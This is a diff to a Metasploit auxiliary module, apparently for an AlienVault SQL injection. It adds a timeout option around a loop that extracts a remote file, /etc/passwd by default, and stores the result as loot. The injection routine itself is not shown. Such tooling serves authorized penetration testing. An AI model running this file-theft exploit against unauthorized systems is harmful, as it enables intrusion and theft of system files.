@@ -41,7 +41,8 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
         OptString.new('USERNAME', [ true, 'Single username' ]),
         OptString.new('PASSWORD', [ true, 'Single password' ]),
-        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
+        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ]),
+        OptInt.new('SQLI_TIMEOUT', [ true, 'Specify the maximum time to exploit the sqli (in seconds)', 60])
       ], self.class)
   end
 
@@ -107,16 +108,27 @@ class Metasploit4 < Msf::Auxiliary
 
     print_status("#{peer} - Exploiting SQLi...")
 
-    loop do
-      file = sqli(left_marker, right_marker, sql_true, i, cookie, filename)
-      return if file.nil?
-      break if file.empty?
+    begin
+      ::Timeout.timeout(datastore['SQLI_TIMEOUT']) do
+        loop do
+          file = sqli(left_marker, right_marker, sql_true, i, cookie, filename)
+          return if file.nil?
+          break if file.empty?
 
-      str = [file].pack("H*")
-      full << str
-      vprint_status(str)
+          str = [file].pack("H*")
+          full << str
+          vprint_status(str)
 
-      i = i+1
+          i = i+1
+        end
+      end
+    rescue ::Timeout::Error
+      if full.blank?
+        print_error("#{peer} - Timeout while exploiting sqli, nothing recovered")
+      else
+        print_error("#{peer} - Timeout while exploiting sqli, #{full.length} bytes recovered")
+      end
+      return
     end
 
     path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
